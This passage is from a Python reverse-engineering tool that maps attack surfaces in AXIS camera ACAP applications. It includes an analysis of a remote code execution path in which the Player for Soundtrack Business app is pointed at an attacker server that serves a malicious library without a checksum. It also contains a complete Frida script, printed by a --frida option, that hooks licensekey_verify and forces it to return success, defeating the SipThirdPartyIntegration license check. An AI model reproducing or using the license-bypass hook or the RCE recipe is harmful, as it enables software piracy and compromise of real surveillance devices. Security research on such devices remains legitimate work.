        AXIS Player for Soundtrack Business (sbplayer) MIPS32 v1.5.0 surface.

        appId: 413325  binary: sbplayer  version: 1.5.0  arch: mipsisa32r2el NOT STRIPPED
        This is the old MIPS32 variant (pre-aarch64/armhf). Newer variants (1.7.1) exist
        as separate aarch64 and armhf EAPs (covered in sbplayer_surface()).

        Key findings:

        1. UpdateURL axparameter — SSRF / MITM via unvalidated server-supplied checksum
           param.conf: UpdateURL="" type="hidden:string" (empty by default)
           Binary confirms: checksum validation is OPTIONAL — if the server response omits
           the checksum header, the binary logs a warning and continues loading:
             "checksum missing from server response, so can't verify lib..."
           If UpdateURL is set to an attacker-controlled server, the binary will download
           and load a shared library WITHOUT checksum verification, then call dlopen().
           This is a supply-chain style RCE at the ACAP process user level.

        2. downloader_* + curl_request + dlopen chain (confirmed from nm symbols)
           Full function chain: get_update_url → curl_request → checksum verify (optional) →
           downloader_force_check_now → dlopen (load library). All in nm symbol table.

        3. pairing_* functions (Soundtrack Business pairing protocol)
           pairing_get_code, pairing_init, pairing_cleanup — pairing code fetched from
           Soundtrack Business cloud. Authorization:Basic %s present — credentials in memory.

        4. audio_conf_api — ALSA audio pipeline access
           syb_handler_load/unload/play/pause/skip — audio control via D-Bus at com.axis.AudioConf.
           Cannot load controls_api / troubles_api — dynamic library loading at runtime.

        5. watchdog pattern
           watchdog_reset called periodically; if UpdateURL points to a server that hangs,
           watchdog may not reset, causing ACAP restart loop.
        """
        result = {
            'app_id': 413325,
            'app_name': 'Player for Soundtrack Business',
            'binary_name': 'sbplayer',
            'version': '1.5.0',
            'arch': 'MIPS32 rel2 mipsisa32r2el NOT STRIPPED',
            'update_url_param': 'UpdateURL="" — empty default; set via axparameter',
            'update_interval': 'UpdateIntervalSeconds=900 (15 min)',
            'pairing_interval': 'PairingIntervalSeconds=30',
            'checksum_behavior': {
                'present': 'Hard fail — download rejected',
                'absent': 'WARNING only — library loaded anyway ("checksum missing from server response, so can\'t verify lib...")',
            },
            'attack_paths': [
                {
                    'id': 'SBP-1',
                    'title': 'UpdateURL SSRF → malicious shared library load (RCE)',
                    'mechanism': (
                        'Set UpdateURL axparameter to attacker server. Server responds with malicious .so '
                        'and OMITS checksum header. Binary warns but proceeds to dlopen() the library. '
                        'Library runs as ACAP process user (acap-sbplayer).'
                    ),
                    'severity': 'CRITICAL',
                    'prerequisite': 'Operator-level write to UpdateURL axparameter (config_o.cgi or api_o.cgi)',
                    'note': 'This is a stronger variant of the checksum-bypass finding from sbplayer_surface()',
                },
                {
                    'id': 'SBP-2',
                    'title': 'Pairing code MITM — Soundtrack Business auth bypass',
                    'mechanism': (
                        'Authorization:Basic in memory during pairing handshake. '
                        'ignoreCert-equivalent behavior unclear — fuzz pairing protocol for bypass.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Network MITM on Soundtrack Business cloud traffic',
                },
            ],
            'storage_api': 'ax_storage_setup_async / ax_storage_get_path — writes audio to external storage',
            'dbus_path': 'com.axis.AudioConf.Application',
        }
        return result

    # ── internal helpers ──────────────────────────────────────────────────────

    def _read_manifest(self, pkg_dir: Path) -> dict:
        m = pkg_dir / 'manifest.json'
        if m.exists():
            try:
                return json.loads(m.read_text())
            except Exception:
                pass
        p = pkg_dir / 'package.conf'
        if p.exists():
            cfg = {}
            for line in p.read_text().splitlines():
                if '=' in line:
                    k, _, v = line.partition('=')
                    cfg[k.strip()] = v.strip().strip('"\'')
            return cfg
        return {}

    def _verify_license_disasm(self, binary_path: str) -> dict:
        """Confirm key disasm landmarks from the licensekey bypass chain."""
        checks = {}
        strs = _strings(binary_path)
        checks['has_licensekey_path_env'] = 'licensekey_path' in strs
        checks['has_ld_preload_check'] = '/etc/ld.so.preload' in strs
        checks['has_ld_library_path'] = 'LD_LIBRARY_PATH' in strs
        checks['has_enabled_sentinel'] = self.ENABLED_FILE in strs
        checks['has_sipd_check'] = '/usr/bin/sipd' in strs
        checks['has_pem_read_rsa'] = 'PEM_read_RSA_PUBKEY' in strs
        checks['has_liblicensekey_so'] = 'liblicensekey.so' in strs
        # Verify dynamic import of licensekey_dyn_* (not static)
        _, imports = _nm(binary_path)
        checks['imports_licensekey_dyn_verify'] = 'licensekey_dyn_verify' in imports
        checks['imports_dlopen'] = any('dlopen' in i for i in imports)
        return checks

    def _sip_frida_hook(self) -> str:
        """
        Frida script to bypass licensekey_verify() on device.

        Hooks the wrapper in SipThirdPartyIntegration (which calls licensekey_dyn_verify@plt)
        AND the underlying liblicensekey.so.1 symbol for defense-in-depth bypass.
        """
        return r"""
// AXIS SipThirdPartyIntegration — licensekey_verify bypass
// Attach to the ACAP process: frida -n SipThirdPartyIntegration -l axis_license_bypass.js
// Or via USB: frida -U -n SipThirdPartyIntegration -l axis_license_bypass.js

'use strict';

const LIBNAME = 'liblicensekey.so.1';

function hookLicensekey() {
    // Hook 1: high-level wrapper exported from the ACAP binary itself
    const mod = Process.findModuleByName('SipThirdPartyIntegration');
    if (mod) {
        // licensekey_verify @ 0x26b0 (PIE — use symbol name)
        const sym = mod.findExportByName('licensekey_verify');
        if (sym) {
            Interceptor.attach(sym, {
                onLeave(retval) { retval.replace(1); }
            });
            console.log('[axis] hooked SipThirdPartyIntegration!licensekey_verify');
        }
        // licensekey_verify_ex
        const symEx = mod.findExportByName('licensekey_verify_ex');
        if (symEx) {
            Interceptor.attach(symEx, {
                onLeave(retval) { retval.replace(1); }
            });
            console.log('[axis] hooked SipThirdPartyIntegration!licensekey_verify_ex');
        }
    }

    // Hook 2: underlying dynamic resolver in liblicensekey.so.1
    const lib = Process.findModuleByName(LIBNAME);
    if (lib) {
        for (const name of ['licensekey_dyn_verify', 'licensekey_dyn_verify_ex']) {
            const s = lib.findExportByName(name);
            if (s) {
                Interceptor.attach(s, {
                    onLeave(retval) { retval.replace(1); }
                });
                console.log('[axis] hooked ' + LIBNAME + '!' + name);
            }
        }
    }
}

// Wait for liblicensekey.so.1 to load if not yet present
if (Process.findModuleByName(LIBNAME)) {
    hookLicensekey();
} else {
    Interceptor.attach(Module.findExportByName(null, 'dlopen'), {
        onLeave(retval) {
            if (Process.findModuleByName(LIBNAME)) hookLicensekey();
        }
    });
}
""".strip()


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='AXIS ACAP EAP RE module',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument('target', help='Path to AXIS directory or single EAP/ELF binary')
    parser.add_argument('--all', action='store_true', help='Run all analysis passes')
    parser.add_argument('--survey', action='store_true', help='Survey all packages')
    parser.add_argument('--license-bypass', action='store_true',
                        help='Map licensekey_verify bypass vectors (SipThirdPartyIntegration)')
    parser.add_argument('--bodyworn', action='store_true', help='BodyWornLiveSelfHosted attack surface')
    parser.add_argument('--barcode', action='store_true', help='BarcodeReader VAPIX attack surface')
    parser.add_argument('--facedetector', action='store_true', help='facedetector CGI attack surface')
    parser.add_argument('--lpv', action='store_true', help='License Plate Verifier (fflprapp) attack surface')
    parser.add_argument('--people-counter', action='store_true', dest='people_counter',
                        help='People Counter (tvpc) attack surface')
    parser.add_argument('--ptz-snmp', action='store_true', dest='ptz_snmp',
                        help='PTZ over SNMP (axptzoversnmp) NTCIP MIB attack surface')
    parser.add_argument('--sensor-metrics', action='store_true', dest='sensor_metrics',
                        help='Sensor Metrics Dashboard (metricdashboard) Modbus/NMEA attack surface')
    parser.add_argument('--metadata-provider', action='store_true', dest='metadata_provider',
                        help='Metadata Provider (metadata_provider) MQTT bridge attack surface')
    parser.add_argument('--3dpc', action='store_true', dest='a3dpc',
                        help='AXIS 3D People Counter (a3dpc) pyrun/admin-CGI attack surface')
    parser.add_argument('--sbplayer', action='store_true', dest='sbplayer',
                        help='Player for Soundtrack Business (sbplayer) UpdateURL/library attack surface')
    parser.add_argument('--ptz-remote', action='store_true', dest='ptz_remote',
                        help='p-ptz remote connection (remote_ptz_conn_setup) SSRF surface')
    parser.add_argument('--storedatamanager', action='store_true', dest='storedatamanager',
                        help='StoreDataManager (Cognimatics TrueView) server app RE surface')
    parser.add_argument('--digital-autotrack', action='store_true', dest='digital_autotrack',
                        help='AXIS Digital Auto Tracking encrypted Lua + script.sh RE surface')
    parser.add_argument('--ucs', action='store_true', dest='ucs',
                        help='UCS/SipThirdPartyIntegration sipd+licensekey bypass surface')
    parser.add_argument('--people-counter-s5l', action='store_true', dest='people_counter_s5l',
                        help='People Counter 4.0.0 ARTPEC-5/S5L surface (TrueviewVAPIX account)')
    parser.add_argument('--sbplayer-mips', action='store_true', dest='sbplayer_mips',
                        help='sbplayer MIPS32 1.5.0 UpdateURL checksum-optional RCE surface')
    parser.add_argument('--radar', action='store_true', dest='radar',
                        help='Radar Integration for Microbus ARM32 1.0.1 surface')
    parser.add_argument('--di', action='store_true', dest='di',
                        help='Demographic Identifier tvgd ARM32 1.6.2 PII/tarslip surface')
    parser.add_argument('--vmd', action='store_true', dest='vmd',
                        help='Video Motion Detection 4 ARM32 4.4.4 ONVIF/libscene surface')
    parser.add_argument('--informacast', action='store_true', dest='informacast',
                        help='InformaCast Speaker ARM32 1.0.8 sentinel/SSRF surface')
    parser.add_argument('--dce', action='store_true', dest='dce',
                        help='Door Controller Extension ARM32 1.1.5 stub + build path leak')
    parser.add_argument('--dat', action='store_true', dest='digital_autotrack_v2',
                        help='Digital Autotracking 1.0.0 encrypted Lua + shttpclient XSS surface')
    parser.add_argument('--queue-monitor', action='store_true', dest='queue_monitor',
                        help='Queue Monitor tvqu ARM32 3.0.20 tarslip + libsodium + TLS bypass surface')
    parser.add_argument('--loitering-guard', action='store_true', dest='loitering_guard',
                        help='Loitering Guard ARM32 2.3.8 SocketCameraContainer SSRF + libscene surface')
    parser.add_argument('--vmd458', action='store_true', dest='vmd458',
                        help='VMD 4.5.8 aarch64 libexpat namespace confusion + libscene substitution')
    parser.add_argument('--vmd3', action='store_true', dest='vmd3',
                        help='VMD 3.2.0 Lua encrypted combined.lua + polygon float injection')
    parser.add_argument('--radar-vis', action='store_true', dest='radar_vis',
                        help='Radar Data Visualizer 3.3.2 viewer consume.cgi + resvg SVG path injection')
    parser.add_argument('--bw-lss', action='store_true', dest='bw_lss',
                        help='Body Worn Live Self-hosted Server 1.5.1 TURN credential leak + configure CGI destruct ops')
    parser.add_argument('--speed-monitor', action='store_true', dest='speed_monitor',
                        help='Speed Monitor ARM32 1.1.7 SQLite track dump + bundled protobuf/xml2 + radar scene')
    parser.add_argument('--fence-guard', action='store_true', dest='fence_guard',
                        help='Fence Guard aarch64 2.3.8 SocketCameraContainer SSRF + ONVIF state event injection')
    parser.add_argument('--motion-guard', action='store_true', dest='motion_guard',
                        help='Motion Guard ARM32 2.2.3 SocketCameraContainer SSRF + D-Bus FD passing')
    parser.add_argument('--live-privacy-shield', action='store_true', dest='live_privacy_shield',
                        help='Live Privacy Shield ARM32 2.8.8 D-Bus method injection + DoS privacy masking')
    parser.add_argument('--audio-spectrum', action='store_true', dest='audio_spectrum',
                        help='Audio Spectrum Visualizer aarch64 2.3.0 cairo OOB + param integer overflow')
    parser.add_argument('--cognimatics-tvpc', action='store_true', dest='cognimatics_tvpc',
                        help='Cognimatics tvpc variants 3.12.1 runs-as-root tarslip + debugar coredump + SWEET32')
    parser.add_argument('--occupancy-estimator', action='store_true', dest='occupancy_estimator',
                        help='Occupancy Estimator 3.16.3 root tarslip + TCP 23456/4066 unauth + SlavePass + TrueviewVAPIX')
    parser.add_argument('--cross-line', action='store_true', dest='cross_line',
                        help='Cross Line Detection 1.1.5 encrypted Lua LD_PRELOAD + geometry float injection')
    parser.add_argument('--pc5', action='store_true', dest='pc5',
                        help='People Counter 5.0.5 Rust rewrite; dropped root; popen+tarslip+TCP 23456/4066 remain')
    parser.add_argument('--qm3', action='store_true', dest='qm3',
                        help='Queue Monitor 3.0.20 Rust rewrite; SSRF via WebReportUpload + AllowInsecure + popen')
    parser.add_argument('--direction-detector', action='store_true', dest='direction_detector',
                        help='Direction Detector 3.16.3 tvpc root; anon-gui mount --bind + dual tarslip + FTP coredump exfil')
    parser.add_argument('--random-selector', action='store_true', dest='random_selector',
                        help='Random Selector 3.12.0 tvpc root; mini_snmpd community=public + dual tarslip')
    parser.add_argument('--sbplayer-aarch64', action='store_true', dest='sbplayer_aarch64',
                        help='sbplayer aarch64/ARM32 1.7.1 UpdateURL+SD-card library RCE + hardcoded SYB API cred')
    parser.add_argument('--frida', action='store_true', help='Print Frida license bypass script')
    parser.add_argument('--json', action='store_true', help='Output JSON')
    args = parser.parse_args()

    analyzer = AxisEAPAnalyzer(args.target)
    results = {}

    if args.all or args.survey:
        results['survey'] = analyzer.survey()

    if args.all or args.license_bypass:
        results['license_bypass'] = analyzer.licensekey_bypass_vectors()

    if args.all or args.bodyworn:
        results['bodyworn'] = analyzer.bodyworn_attack_surface()

    if args.all or args.barcode:
        results['barcode'] = analyzer.barcode_vapix_surface()

    if args.all or args.facedetector:
        results['facedetector'] = analyzer.facedetector_surface()

    if args.all or args.lpv:
        results['lpv'] = analyzer.lpv_surface()

    if args.all or args.people_counter:
        results['people_counter'] = analyzer.people_counter_surface()

    if args.all or args.ptz_snmp:
        results['ptz_snmp'] = analyzer.ptz_snmp_surface()

    if args.all or args.sensor_metrics:
        results['sensor_metrics'] = analyzer.sensor_metrics_surface()

    if args.all or args.metadata_provider:
        results['metadata_provider'] = analyzer.metadata_provider_surface()

    if args.all or args.a3dpc:
        results['a3dpc'] = analyzer.a3dpc_surface()

    if args.all or args.sbplayer:
        results['sbplayer'] = analyzer.sbplayer_surface()

    if args.all or args.ptz_remote:
        results['ptz_remote'] = analyzer.ptz_remote_surface()

    if args.all or args.storedatamanager:
        results['storedatamanager'] = analyzer.storedatamanager_surface()

    if args.all or args.digital_autotrack:
        results['digital_autotrack'] = analyzer.digital_autotrack_surface()

    if args.all or args.ucs:
        results['ucs'] = analyzer.ucs_sip_surface()

    if args.all or args.people_counter_s5l:
        results['people_counter_s5l'] = analyzer.people_counter_s5l_surface()

    if args.all or args.sbplayer_mips:
        results['sbplayer_mips'] = analyzer.sbplayer_mips_surface()

    if args.all or args.radar:
        results['radar'] = analyzer.radar_microbus_surface()

    if args.all or args.di:
        results['di'] = analyzer.demographic_identifier_surface()

    if args.all or args.vmd:
        results['vmd'] = analyzer.vmd_surface()

    if args.all or args.informacast:
        results['informacast'] = analyzer.informacast_surface()

    if args.all or args.dce:
        results['dce'] = analyzer.dce_surface()

    if args.all or args.digital_autotrack_v2:
        results['dat_encrypted_lua'] = analyzer.dat_encrypted_lua_surface()

    if args.all or getattr(args, 'queue_monitor', False):
        results['queue_monitor'] = analyzer.queue_monitor_surface()

    if args.all or getattr(args, 'loitering_guard', False):
        results['loitering_guard'] = analyzer.loitering_guard_surface()

    if args.all or getattr(args, 'vmd458', False):
        results['vmd458'] = analyzer.vmd_458_surface()

    if args.all or getattr(args, 'vmd3', False):
        results['vmd3'] = analyzer.vmd3_lua_surface()

    if args.all or getattr(args, 'radar_vis', False):
        results['radar_vis'] = analyzer.radar_data_visualizer_surface()

    if args.all or getattr(args, 'bw_lss', False):
        results['bw_lss'] = analyzer.bw_lss_surface()

    if args.all or getattr(args, 'speed_monitor', False):
        results['speed_monitor'] = analyzer.speed_monitor_surface()

    if args.all or getattr(args, 'fence_guard', False):
        results['fence_guard'] = analyzer.fence_guard_surface()

    if args.all or getattr(args, 'motion_guard', False):
        results['motion_guard'] = analyzer.motion_guard_surface()

    if args.all or getattr(args, 'live_privacy_shield', False):
        results['live_privacy_shield'] = analyzer.live_privacy_shield_surface()

    if args.all or getattr(args, 'audio_spectrum', False):
        results['audio_spectrum'] = analyzer.audio_spectrum_visualizer_surface()

    if args.all or getattr(args, 'cognimatics_tvpc', False):
        results['cognimatics_tvpc'] = analyzer.cognimatics_tvpc_variants_surface()

    if args.all or getattr(args, 'occupancy_estimator', False):
        results['occupancy_estimator'] = analyzer.occupancy_estimator_surface()

    if args.all or getattr(args, 'cross_line', False):
        results['cross_line'] = analyzer.cross_line_surface()

    if args.all or getattr(args, 'pc5', False):
        results['pc5'] = analyzer.people_counter_v5_surface()

    if args.all or getattr(args, 'qm3', False):
        results['qm3'] = analyzer.queue_monitor_v3_surface()

    if args.all or getattr(args, 'direction_detector', False):
        results['direction_detector'] = analyzer.direction_detector_surface()

    if args.all or getattr(args, 'random_selector', False):
        results['random_selector'] = analyzer.random_selector_surface()

    if args.all or args.sbplayer_aarch64:
        results['sbplayer_aarch64'] = analyzer.sbplayer_aarch64_surface()

    if args.frida:
        a = AxisEAPAnalyzer(args.target)
        print(a._sip_frida_hook())
        return

    if not results:
        results['survey'] = analyzer.survey()

    if args.json:
        print(json.dumps(results, indent=2, default=str))
    else:
        _pretty_print(results)


def _pretty_print(results: dict):
    for section, data in results.items():
        print(f'\n{"="*60}')
        print(f'  {section.upper()}')
        print('='*60)
        _print_dict(data, indent=0)


def _print_dict(obj, indent: int):
    pad = '  ' * indent
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, (dict, list)):
                print(f'{pad}{k}:')
                _print_dict(v, indent + 1)
            else:
                print(f'{pad}{k}: {v}')
    elif isinstance(obj, list):
        for item in obj:
            if isinstance(item, dict):
                _print_dict(item, indent)
                print()
            else:
                print(f'{pad}- {item}')
    else:
        print(f'{pad}{obj}')


if __name__ == '__main__':
    main()
